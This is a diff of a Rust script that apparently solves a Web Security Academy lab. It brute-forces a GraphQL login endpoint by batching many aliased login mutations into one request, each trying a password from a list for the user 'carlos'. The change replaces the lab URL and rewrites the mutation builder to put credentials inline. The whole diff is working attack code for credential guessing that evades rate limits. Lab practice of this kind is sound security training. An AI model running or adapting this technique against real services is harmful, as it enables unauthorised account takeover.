@@ -23,7 +23,7 @@ use std::{
 use text_colorizer::Colorize;
 
 // Change this to your lab URL
-const LAB_URL: &str = "https://0a150086045d579c80ed99a700a60036.web-security-academy.net";
+const LAB_URL: &str = "https://0aec007904a1645d80d7d52b00080050.web-security-academy.net";
 
 lazy_static! {
     static ref WEB_CLIENT: Client = build_web_client();
@@ -74,18 +74,9 @@ fn build_web_client() -> Client {
 }
 
 fn try_multiple_passwords_to_login(password_list: &Vec<String>) -> Response {
-    let password_count = password_list.len();
-    let login_inputs = build_login_inputs(password_count);
-    let attempts = build_attempts(password_count);
-    let variables = build_variables(&password_list);
-    let body_json = format!(
-        r###"{{ "query": "mutation login({login_inputs}) {{
-                            {attempts}
-                        }}",
-                "operationName": "login",
-                "variables": {{ {variables} }}
-            }}"###
-    );
+    let attempts = build_attempts(&password_list);
+    let mutation = format!(r###"mutation login {{ {attempts} }}"###);
+    let body_json = format!(r###"{{ "query": "{mutation}", "operationName": "login" }}"###);
 
     WEB_CLIENT
         .post(format!("{LAB_URL}/graphql/v1"))
@@ -95,47 +86,20 @@ fn try_multiple_passwords_to_login(password_list: &Vec<String>) -> Response {
         .expect(&format!("{}", "⦗!⦘ Failed to query hte user".red()))
 }
 
-fn build_login_inputs(password_count: usize) -> String {
-    let mut inputs = String::new();
-
-    for counter in 1..=password_count {
-        let to_push = format!(r###"$input{counter}: LoginInput!, "###);
-        inputs.push_str(&to_push);
-    }
-    return inputs;
-}
-
-fn build_attempts(password_count: usize) -> String {
+fn build_attempts(password_list: &Vec<String>) -> String {
     let mut attempts = String::new();
 
-    for counter in 1..=password_count {
+    for (index, password) in password_list.iter().enumerate() {
         let to_push = format!(
-            r###"attempt{counter}:login(input: $input{counter}) {{
-                                    token
-                                    success
-                                }}
-                                "###
+            r###"attempt{}:login(input: {{ username: \"carlos\", password: \"{password}\" }}) {{
+                    token
+                    success
+                }}"###,
+            index + 1
         );
         attempts.push_str(&to_push);
     }
     return attempts;
-}
-
-fn build_variables(password_list: &Vec<String>) -> String {
-    let mut variables = String::new();
-    let password_count = password_list.len();
-
-    for (index, password) in password_list.iter().enumerate() {
-        let to_push = format!(
-            r###""input{}":{{"username":"carlos","password":"{password}"}}"###,
-            index + 1
-        );
-        variables.push_str(&to_push);
-        if index != password_count - 1 {
-            variables.push(',');
-        }
-    }
-    return variables;
 }
 
 fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
